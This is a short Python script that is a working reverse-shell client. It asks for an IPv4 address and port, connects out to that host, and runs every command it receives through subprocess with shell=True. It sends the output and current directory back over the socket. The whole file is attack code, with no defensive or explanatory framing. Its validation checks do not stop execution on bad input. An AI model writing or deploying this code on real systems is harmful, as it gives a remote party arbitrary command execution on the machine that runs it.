import socket
import os
import subprocess

s = socket.socket()

host = str(input("Enter the IPv4 address of the device listening for a connection:  "))
# Validate host value
try:
    socket.inet_aton(host)
except socket.error as msg:
    print("A valid ipv4 address was not defined {}".format(msg)) # This may need to be changed to + str(msg) depending on your python3 version

port = int(input("What port is listening for a connection: "))
# Validate port value
def test_port(n):
    if n in range(1, 65535):
        print()
    else:
        print("A valid port number was not specified")

test_port(port)

print("Connection taking place...")
s.connect((host, port))

while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd': # cd needs to be defined to show the directory changes in your terminal
                os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")

                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                # This displays the directory we are in on the server side
                print(output_str)
s.close()
